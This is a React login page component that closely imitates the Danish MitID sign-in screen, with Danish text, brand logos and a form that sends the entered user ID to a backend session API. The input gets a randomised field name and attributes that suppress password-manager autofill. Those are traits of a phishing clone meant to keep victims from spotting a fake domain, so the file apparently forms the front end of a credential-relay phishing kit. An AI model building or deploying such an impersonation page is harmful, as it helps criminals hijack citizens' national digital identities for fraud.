import { useState } from 'react'
import BrandLogo from '../components/BrandLogo'
import MitIdLogo from '../components/MitIdLogo'
import CardShell from '../components/CardShell'
import HelpIcon from '../components/HelpIcon'
import ArrowIcon from '../components/ArrowIcon'
import SidePanel from '../components/SidePanel'
import { api } from '../services/api'

interface Props {
  onSessionCreated: (sessionId: string, userId: string) => void
}

export default function LoginPage({ onSessionCreated }: Props) {
  const [userId, setUserId] = useState('')
  const [showUserId, setShowUserId] = useState(true)
  const [remember, setRemember] = useState(false)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!userId.trim()) return
    setLoading(true)
    setError('')
    try {
      const { sessionId } = await api.initSession(userId)
      onSessionCreated(sessionId, userId)
    } catch {
      setError('Forbindelsen mislykkedes. Prøv igen.')
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="min-h-screen flex flex-col" style={{ fontFamily: '"IBM Plex Sans", Arial, Helvetica, FreeSans, sans-serif', lineHeight: '1.5rem', fontSize: '1rem', color: '#333', background: '#fff' }}>
      <header className="hidden sm:flex bg-white h-[50px] items-center px-6 border-b border-gray-200">
        <BrandLogo />
      </header>
      <main className="flex-1 flex items-start justify-center sm:pt-[60px] pt-0 px-0 sm:px-6">
        <div className="flex flex-col lg:flex-row gap-[60px] max-w-[900px] w-full items-center lg:items-start">
          <CardShell>
            <form onSubmit={handleSubmit} className="flex flex-col h-full" style={{ width: '100%', boxSizing: 'content-box' }}>
              <div className="flex items-start justify-between mb-0">
                <h1 className="text-[17px] font-bold leading-[1.35] pr-4">Log på hos MitID.dk</h1>
                <MitIdLogo />
              </div>
              <hr className="border-gray-300 mt-[12px] mb-[16px]" />
              <div className="mb-[16px]">
                <div className="flex items-center gap-[6px] mb-[8px]">
                  <label className="text-[14px] font-bold uppercase tracking-wide">Bruger-ID</label>
                  <button type="button" className="w-[16px] h-[16px] rounded-full flex items-center justify-center cursor-help" aria-label="Åbn hjælpetekst"><HelpIcon /></button>
                </div>
                <div className="relative">
                  <input type={showUserId ? 'text' : 'password'} value={userId} onChange={(e) => setUserId(e.target.value)}
                    name={`uid_${Math.random().toString(36).slice(2)}`}
                    className="w-full border border-[#999] rounded-[2px] px-[12px] py-[10px] text-[14px] focus:outline-none focus:border-[#0055a5] focus:ring-1 focus:ring-[#0055a5] pr-[60px]" autoComplete="off" inputMode="text" data-lpignore="true" data-1p-ignore="true" spellCheck={false} />
                  <div role="button" onClick={() => setShowUserId(!showUserId)} className="absolute right-[12px] top-1/2 -translate-y-1/2 text-[14px] text-[#0055a5] cursor-pointer select-none font-medium" tabIndex={0}>
                    {showUserId ? 'Skjul' : 'Vis'}
                  </div>
                </div>
              </div>
              {error && <div className="text-red-600 text-[12px] mb-2">{error}</div>}
              <button type="submit" disabled={loading || !userId.trim()}
                className={`w-full font-bold text-[15px] py-[11px] px-[16px] rounded-[3px] flex items-center justify-between transition-colors ${
                  userId.trim() && !loading
                    ? 'bg-[#0055a5] hover:bg-[#004080] text-white cursor-pointer'
                    : 'bg-[#e6e6e6] text-[#999] cursor-not-allowed'
                }`}>
                <span className="uppercase tracking-[0.02em]">{loading ? 'Forbinder...' : 'Fortsæt'}</span><ArrowIcon />
              </button>
              <div className="mt-[20px] mb-[4px]">
                <a href="#" className="inline-flex items-center gap-[8px] text-[#0055a5] hover:underline text-[15px] font-bold">
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M11 7h2v2h-2V7zm0 4h2v6h-2v-6zm1-9C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z" fill="#0055a5"/></svg>
                  <span>Glemt bruger-ID?</span>
                </a>
              </div>
              <div className="flex-1" />
              <label className="flex items-center gap-[10px] cursor-pointer mb-[12px]">
                <input type="checkbox" checked={remember} onChange={(e) => setRemember(e.target.checked)} className="w-[18px] h-[18px] accent-[#0055a5] cursor-pointer shrink-0" />
                <span className="text-[14px] leading-snug">Husk mig hos MitID.dk</span>
              </label>
              <hr className="border-gray-300 mb-[12px]" />
              <nav className="flex items-center gap-[24px] text-[14px] text-[#0055a5] font-medium ml-[-4px]">
                <a href="#" className="hover:underline">Afbryd</a><a href="#" className="hover:underline">Hjælp</a>
              </nav>
            </form>
          </CardShell>
          <div className="hidden lg:block"><SidePanel /></div>
        </div>
      </main>
    </div>
  )
}
